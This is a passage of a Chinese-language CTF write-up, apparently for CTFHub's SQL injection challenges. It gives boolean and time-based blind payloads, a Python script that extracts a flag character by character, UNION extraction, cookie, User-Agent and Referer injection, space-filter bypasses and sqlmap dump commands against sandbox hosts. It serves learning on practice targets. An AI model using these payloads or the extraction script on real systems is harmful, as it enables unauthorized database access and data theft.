shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * from users WHERE id = 1 AND </span><br><span class="line">(select count(table_name) from information_schema.`TABLES` where table_schema = database()) = 4</span><br></pre></td></tr></table></figure></li><li><p>求当前数据库表的表名长度</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">length</span></span><br><span class="line"></span><br><span class="line">SELECT * from users WHERE id = 1 </span><br><span class="line">AND (LENGTH(</span><br><span class="line">(select table_name from information_schema.`TABLES` where table_schema = database() LIMIT 0,1)</span><br><span class="line">)) = 6</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">substr</span></span><br><span class="line"></span><br><span class="line">SELECT * from users WHERE id = 1 </span><br><span class="line">AND ASCII(SUBSTR(</span><br><span class="line">(select table_name FROM information_schema.`TABLES` where table_schema = database() LIMIT 0,1),</span><br><span class="line">6,1))</span><br></pre></td></tr></table></figure></li><li><p>求表名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SELECT * from users WHERE id = 1 </span><br><span class="line">AND ASCII(SUBSTR(</span><br><span class="line">(select table_name FROM information_schema.`TABLES` where table_schema = database() LIMIT 0,1),</span><br><span class="line">1,1)) = 101 # e</span><br><span class="line">SELECT * from users WHERE id = 1 </span><br><span class="line">AND ASCII(SUBSTR(</span><br><span class="line">(select table_name FROM information_schema.`TABLES` where table_schema = database() LIMIT 0,1),</span><br><span class="line">2,1)) = 109 # m</span><br></pre></td></tr></table></figure></li><li><p>求指定表中列的数量</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * from users WHERE id = 1 </span><br><span class="line">AND (select count(column_name) from information_schema.columns where table_name = &quot;users&quot;) = 3</span><br></pre></td></tr></table></figure></li><li><p>求指定表中列的长度</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT * from users WHERE id = 1 </span><br><span class="line">AND ASCII(SUBSTR(</span><br><span class="line">(select column_name from information_schema.columns where table_name = &quot;users&quot; limit 0,1),</span><br><span class="line">2,1))</span><br></pre></td></tr></table></figure></li><li><p>求指定表中的列名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT * from users WHERE id = 1 </span><br><span class="line">AND ASCII(SUBSTR(</span><br><span class="line">(select column_name from information_schema.columns where table_name = &quot;users&quot; limit 0,1),</span><br><span class="line">1,1)) = 105</span><br></pre></td></tr></table></figure></li><li><p>求指定表中某字段的数量</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * from users WHERE id = 1 AND (select count(username) from users) = 13</span><br></pre></td></tr></table></figure></li><li><p>求字段长度</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * from users WHERE id = 1 AND ASCII(SUBSTR((select username from users  limit 0,1),4,1))</span><br></pre></td></tr></table></figure></li><li><p>求字段名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * from users WHERE id = 1 and ASCII(SUBSTR((select username from users  limit 0,1),1,1))  = 68</span><br></pre></td></tr></table></figure></li><li><p>假设查询查询 <code>user</code> 这个字段的数据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">猜解 dvwa.users 表下的 user 列的第一个字段内容为：a</span></span><br><span class="line">1&#x27; and ascii(substr((select user from dvwa.users limit 0,1),1,1))=97 # </span><br></pre></td></tr></table></figure></li></ul><h6 id="2-脚本解题">2.脚本解题</h6><p>正如上面的代码所示，都是重复的代码，所以直接写个脚本就完事了（我自己看网上的脚本大多是暴力的，因为我有一定算法基础，因此手撸个二分加速的<s>水平还是不行，debug害我用开了四次环境用了200币(T_T)</s></p><p>但是觉得发现还没有别人暴力跑出来的快(T_T)（主要是因为查询的更清楚）因为要解的是这题，所以就不贴我的代码的</p><p>记得改url</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time <span class="comment"># 测试用的时间（这里不需要）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#你的url</span></span><br><span class="line">urlOPEN = <span class="string">&#x27;http://challenge-45c8b825d982f37a.sandbox.ctfhub.com:10800/?id=&#x27;</span></span><br><span class="line">starOperatorTime = []</span><br><span class="line">mark = <span class="string">&#x27;query_success&#x27;</span> <span class="comment"># 返回的mark，用于判断bool类型</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">database_name</span>():</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;sqcwertyuioplkjhgfdazxvbnm&#x27;</span>:</span><br><span class="line">            url = urlOPEN + <span class="string">&#x27;if(substr(database(),%d,1)=&quot;%s&quot;,1,(select table_name from information_schema.tables))&#x27;</span> % (</span><br><span class="line">            j, i)</span><br><span class="line">            <span class="comment"># print(url+&#x27;%23&#x27;)</span></span><br><span class="line">            r = requests.get(url)</span><br><span class="line">            <span class="keyword">if</span> mark <span class="keyword">in</span> r.text:</span><br><span class="line">                name = name + i</span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>(name)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;database_name:&#x27;</span>, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">database_name()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">table_name</span>():</span><br><span class="line">    <span class="built_in">list</span> = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">4</span>):</span><br><span class="line">        name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">9</span>):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;sqcwertyuioplkjhgfdazxvbnm&#x27;</span>:</span><br><span class="line">                url = urlOPEN + <span class="string">&#x27;if(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)=&quot;%s&quot;,1,(select table_name from information_schema.tables))&#x27;</span> % (</span><br><span class="line">                k, j, i)</span><br><span class="line">                <span class="comment"># print(url+&#x27;%23&#x27;)</span></span><br><span class="line">                r = requests.get(url)</span><br><span class="line">                <span class="keyword">if</span> mark <span class="keyword">in</span> r.text:</span><br><span class="line">                    name = name + i</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">list</span>.append(name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;table_name:&#x27;</span>, <span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># start = time.time()</span></span><br><span class="line">table_name()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">column_name</span>():</span><br><span class="line">    <span class="built_in">list</span> = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">3</span>):  <span class="comment"># 判断表里最多有4个字段</span></span><br><span class="line">        name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">9</span>):  <span class="comment"># 判断一个 字段名最多有9个字符组成</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;sqcwertyuioplkjhgfdazxvbnm&#x27;</span>:</span><br><span class="line">                url = urlOPEN + <span class="string">&#x27;if(substr((select column_name from information_schema.columns where table_name=&quot;flag&quot;and table_schema= database() limit %d,1),%d,1)=&quot;%s&quot;,1,(select table_name from information_schema.tables))&#x27;</span> % (</span><br><span class="line">                k, j, i)</span><br><span class="line">                r = requests.get(url)</span><br><span class="line">                <span class="keyword">if</span> mark <span class="keyword">in</span> r.text:</span><br><span class="line">                    name = name + i</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">list</span>.append(name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;column_name:&#x27;</span>, <span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">column_name()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>():</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):  <span class="comment"># 判断一个值最多有51个字符组成</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">126</span>):</span><br><span class="line">            url = urlOPEN + <span class="string">&#x27;if(ascii(substr((select flag from flag),%d,1))=%d,1,(select table_name from information_schema.tables))&#x27;</span> % (</span><br><span class="line">            j, i)</span><br><span class="line">            r = requests.get(url)</span><br><span class="line">            <span class="keyword">if</span> mark <span class="keyword">in</span> r.text:</span><br><span class="line">                name = name + <span class="built_in">chr</span>(i)</span><br><span class="line">                <span class="built_in">print</span>(name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;value:&#x27;</span>, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get_data()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/bool/1.png" alt="1"></p><h6 id="3-sqlmap-2">3.sqlmap</h6><p>再次强调神器一个好吧，无脑上面操作</p><p>因为原理都一样，sqlmap需要一点点时间进行爆破</p><p>因为已经知道的数据库名，表名，字段名，所以我这里直接搜就行了，如果想要一条一条看，在整数型注入的sqlmap有详细解释</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://challenge-edf7e3fef5ffee34.sandbox.ctfhub.com:10080/?id=-1&quot; -D sqli  -T flag  -C flag --dump</span><br></pre></td></tr></table></figure><h5 id="5-时间盲注">5.时间盲注</h5><h6 id="1-手工注入-4">1.手工注入</h6><p>时间盲注出现的本质原因也是由于服务器端拼接了 SQL语句，但是正确和错误存在同样的回显。错误信息被过滤，不过，可以通过页面响应时间进行按位判断数据。由于时间盲注中的函数是在数据库中执行的，因此在 CTF 比赛中关于时间盲注的题目比较少，原因在于 sleep 函数或者 benchmark 函数的过多执行会让服务器负载过高，再加上CTF 里面的一些“搅屎棍”的参与，会让题目挂掉。不过，有时候我们还是会在 CTF 中遇到这些题目，这里简单说一下注入的方法。</p><p>时间盲注类似于 Bool盲注，只不过是在验证阶段有所不同。Bool盲注是根据页面回显的不同来判断的，而时间盲注是根据页面响应时间来判断结果的。一般来说，延迟的时间可以根据客户端与服务器端之间响应的时间来进行选择，选择一个合适的时间即可。一般来说，时间盲注常用的函数有 sleep0和benchmark() 两个，具体说明如表:</p><table><thead><tr><th>函数名</th><th style="text-align:left">功能及使用方法</th></tr></thead><tbody><tr><td>sleep()</td><td style="text-align:left">sleep是睡眠函数，可以使查询数据时回显数据的响应时间加长。使用方法如sleep(N)，这里的N为睡眠的时间。<br/>使用时可以配合if进行使用。如:<br/>if(ascii(substr(user(),1,1))=114,sleep(5),2)<br/>这样的话。如果 user 的第一位是’r’，则页面返回将延迟5秒。这里需要注意的是，这5秒是在务器端的数据库中延迟的，实际情况可能会由于网络环境等因素延迟更长时间</td></tr><tr><td>benchmark()</td><td style="text-align:left">benchmark 函数原本是用来重复执行某个语句的函数，我们可以用这个函数来测试数据库的读写性能等。使用方法如下:<br/>benchuark(N,expression)<br/>其中，N为执行的次数，expression 为表达式。如果需要进行盲注，我们通常需要进行消耗时间和性能的计算，此如哈希计算函数MD5()，将MD5 函数重复执行数万次则可以达到延迟的效果，而具体的情况需要根据不同比赛的服务器性能及网络情况来决定</td></tr></tbody></table><p>这个也是用脚本就行了，但是我是不推荐，直接用sqlmap就行了</p><h6 id="2-sqlmap-2">2.sqlmap</h6><p>因为已经知道的数据库名，表名，字段名，所以我这里直接搜就行了，如果想要一条一条看，在整数型注入的sqlmap有详细解释</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://challenge-edf7e3fef5ffee34.sandbox.ctfhub.com:10080/?id=-1&quot; -D sqli  -T flag  -C flag --dump</span><br></pre></td></tr></table></figure><h5 id="6-MySQL结构">6.MySQL结构</h5><p>说实话我没感觉什么特别的地方，就是和手工注入直接开干就行了</p><h6 id="1-手工注入-5">1.手工注入</h6><p>1.看列的数量</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1,database()</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/mysql%20structure/2.png" alt="1"></p><p>2.爆库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1,database()</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/mysql%20structure/3.png" alt=""></p><p>3.爆表</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;sqli&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/mysql%20structure/1.png" alt=""></p><p>4.爆字段名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#x27;sqli&#x27; and table_name=&#x27;***&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/mysql%20structure/4.png" alt=""></p><p>5.爆数据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1,group_concat(flag) from sqli.flag</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/mysql%20structure/5.png" alt=""></p><h6 id="2-sqlmap-3">2.sqlmap</h6><p>还是没什么好说的，值得注意的是，这个表名，字段名我们的都应该不一样，即不是sqli.flag.flag，这个需要自己查，还是参考整数型注入的sqlmap就行</p><h5 id="7-Cookie注入">7.Cookie注入</h5><p><a href="https://www.cnblogs.com/0yst3r-2046/p/12493132.html">大佬写的很好</a></p><ol><li><p>什么是cookie</p><blockquote><p>Cookie = 网站身份</p></blockquote><p>指某些网站为了辨别用户身份，进行 session 跟踪而储存在用户本地终端上的数据（通常经过加密）。</p><blockquote><p>COOKIE： 客户端将用户名密码等信息给服务器，服务器返回用户身份对应的cookie给客户端，之后两人的身份认定，就靠cookie来进行。</p></blockquote><p>简单地说，当用户使用浏览器访问一个支持Cookie的网站的时候，用户会提供包括用户名在内的个人信息并且提交至服务器，服务器回传给用户这段个人信息的加密版本，这些信息并不存放在HTTP响应体（Response Body）中，而存放于HTTP响应头（Response Header）。</p></li><li><p>cookie注入的原理</p><p>就要修改cookie的值，我们是将提交的参数已cookie方式提交了，而一般的注入我们是使用get或者post方式提交，get方式提交就是直接在网址后面加上需要注入的语句，post则是通过表单方式，get和post的不同之处就在于一个我们可以通过IE地址栏处看到我们提交的参数，而另外一个却不能。</p><p>相对post和get方式注入来说，cookie注入就要稍微繁琐一些了，要进行cookie注入，我们首先就要修改cookie，这里就需要使用到Javascript语言了。</p><p>cookie注入的两个必须条件：</p><p>条件1是：程序对get和post方式提交的数据进行了过滤，但未对cookie提交的数据库进行过滤。</p><p>条件2是：在条件1的基础上还需要程序对提交数据获取方式是直接request(“xxx”)的方式，未指明使用request对象的具体方法进行获取，也就是说用request这个方法的时候获取的参数可以是是在URL后面的参数也可以是cookie里面的参数这里没有做筛选，之后的原理就像我们的sql注入一样了。</p><p>cookie注入分为以下几个阶段：</p><ol><li>判断是不是注入点</li><li>得到字段总数</li><li>查选表名</li><li>查选列名</li><li>查内容</li></ol></li></ol><h6 id="1-burp-3">1.burp</h6><p>利用burp获取数据包，利用response模块进行cookie注入</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/cookie/1.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/cookie/2.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/cookie/3.png" alt=""></p><p>进行修改cookie，其实还是手工注入</p><p>1.爆库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id = -1 union select, 1, database()</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/cookie/4.png" alt=""></p><p>或者用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id = -1 union select 1, group_concat(schema_name) from information_schema.schemata</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/cookie/5.png" alt=""></p><p>2.爆表</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id = -1 union select 1, group_concat(table_name) from information_schema.tables where table_schema=&#x27;sqli&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/cookie/6.png" alt=""></p><p>3.爆字段名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id = -1 select 1, group_concat(column_name) from information_shcema.columns where table_schema=&#x27;sqli&#x27; and table_name=&#x27;***&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/cookie/7.png" alt=""></p><p>4.爆数据</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/cookie/8.png" alt=""></p><h6 id="2-sqlmap-4">2.sqlmap</h6><p>需要稍微修改一下参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">检测的级别(level), 级别,风险越高,对web造成的伤害性也就越高,常规为默认.(试想下,你帮客户做渗透,结果渗透没做好,把人家web给扫描出问题了....,如果黑客出于攻击行为来使用的话,肯定越高越好..个人理解..)</span> </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">这里需要设置为2就行了</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;http://challenge-38d00693d21d6ccc.sandbox.ctfhub.com:10080&quot; --cookie &quot;id=1&quot; --dbs --level 2</span><br><span class="line"> </span><br><span class="line">python sqlmap.py -u &quot;http://challenge-38d00693d21d6ccc.sandbox.ctfhub.com:10080&quot; --cookie &quot;id=1&quot; -D sqli --tables --level 2</span><br><span class="line"> </span><br><span class="line">python sqlmap.py -u &quot;http://challenge-38d00693d21d6ccc.sandbox.ctfhub.com:10080&quot; --cookie &quot;id=1&quot; -D sqli -T frkadyqcec --columns --dump --level 2</span><br></pre></td></tr></table></figure><h5 id="8-UA注入">8.UA注入</h5><p><a href="https://www.cnblogs.com/0yst3r-2046/p/12493132.html">大佬写的很好，方法更多</a></p><p>User Agent 中文名为用户代理，简称 UA，它是一个特殊字符串头，使得服务器能够识别客户使用的操作系统及版本、CPU 类型、浏览器及版本、浏览器渲染引擎、浏览器语言、浏览器插件等。</p><h6 id="1-Burp">1.Burp</h6><p>其实和cookie的差不多</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/UA/1.png" alt=""></p><p>1.爆库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1, database()</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/UA/2.png" alt=""></p><p>2.报表</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;sqli&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/UA/3.png" alt=""></p><p>3.爆字段名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1, group_concat(column_name) from information_shcema.columns where table_schema = &#x27;sqli&#x27; and table_name=&#x27;***&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/UA/4.png" alt=""></p><p>4.爆数据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1, group_concat(***) from sqli.***</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/UA/5.png" alt=""></p><h6 id="2-sqlmap-5">2.sqlmap</h6><p>这次说实话我是不怎么建议用sqlmap了，扫的时间太长了。。。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://challenge-0db4dfe24728939b.sandbox.ctfhub.com:10080/  --level 3 --dbs</span><br><span class="line"> </span><br><span class="line">python sqlmap.py -u http://challenge-0db4dfe24728939b.sandbox.ctfhub.com:10080/  --level 3 -D sqli --tables</span><br><span class="line"> </span><br><span class="line">python sqlmap.py -u http://challenge-0db4dfe24728939b.sandbox.ctfhub.com:10080/  --level 3 -D sqli -T ztoczxhmwd --columns --dump</span><br></pre></td></tr></table></figure><h5 id="9-Refer注入">9.Refer注入</h5><p>关于http的refer参数<br>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器籍此可以获得一些信息用于处理。比如从我主页上链接到一个朋友那里，他的服务器就能够从HTTP Referer中统计出每天有多少用户点击我主页上的链接访问他的网站。</p><p>如题，通过抓包软件分析后发现header里并没有referer这个参数，<strong>需要自己加上</strong>，下面是效果：<br>(注：本题使用的注入Payload都可以参考上一道题，其实都只是换了个注入的地方，注入的方式都是一样的)<br><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/referer/1.png" alt=""></p><p>1.爆库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1, database()</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/referer/2.png" alt=""></p><p>2.报表</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;sqli&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/referer/3.png" alt=""></p><p>3.爆字段名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1, group_concat(column_name) from information_shcema.columns where table_schema = &#x27;sqli&#x27; and table_name=&#x27;***&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/referer/4.png" alt=""></p><p>4.爆数据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1, group_concat(***) from sqli.***</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/referer/5.png" alt=""></p><h6 id=""></h6><h5 id="10-过滤空格">10.过滤空格</h5><p>在一些题目中，我们发现出题人并没有对关键字进行过滤，反而对空格进行了过滤，这时候就需要用到下面这几种绕过方法。</p><p>1)通过注释绕过，一般的注释符有如下几个:</p><ul><li><code>#</code></li><li><code>--</code></li><li><code>//</code></li><li><code>/**/</code></li><li><code>;%00</code></li></ul><p>这时候，我们就可以通过这些注释符来绕过空格符，比如:<br><code>select/**/username/**/from/**/user</code></p><blockquote><p>下面几种方法是拓展内容，需要自行搜寻</p></blockquote><p>2)通过URL编码绕过，我们知道空格的编码是 %20，所以可以通过二次 URL 编码进行<br>绕过:<br>%20   –      %2520</p><p>3)通过空白字符绕过</p><p>4)通过特殊符号</p><p>5)科学计数法绕过</p><h6 id="1-手工注入-6">1.手工注入</h6><p>知道原理后其实就是很简单的把空格换一下就行了</p><p>1.爆库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,database()</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/Filter%20space/1.png" alt=""></p><p>2.爆表</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/Filter%20space/2.png" alt=""></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span 